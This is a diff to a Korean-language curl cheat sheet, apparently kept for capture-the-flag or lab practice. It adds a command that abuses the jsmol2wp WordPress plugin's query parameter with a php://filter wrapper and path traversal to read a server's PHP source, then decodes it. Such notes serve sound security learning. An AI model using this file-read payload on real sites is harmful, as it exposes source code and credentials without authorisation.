@@ -15,6 +15,10 @@ curl -L http://target.com             # 리다이렉트 따라가기
 curl -v http://target.com             # 모든 요청/응답 상세 표시 (필수)
 curl -I http://target.com             # 헤더만 요청 (HEAD 메소드)
 curl -i http://target.com             # 응답 본문과 헤더 함께 표시
+
+# 리디렉션으로 파일 저장 후 base64 디코딩
+curl "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/read=convert.base64-encode/resource=../../hello.php" > hello.b64
+base64 -d hello.b64 > hello.php
 ```
 
 ## 인증
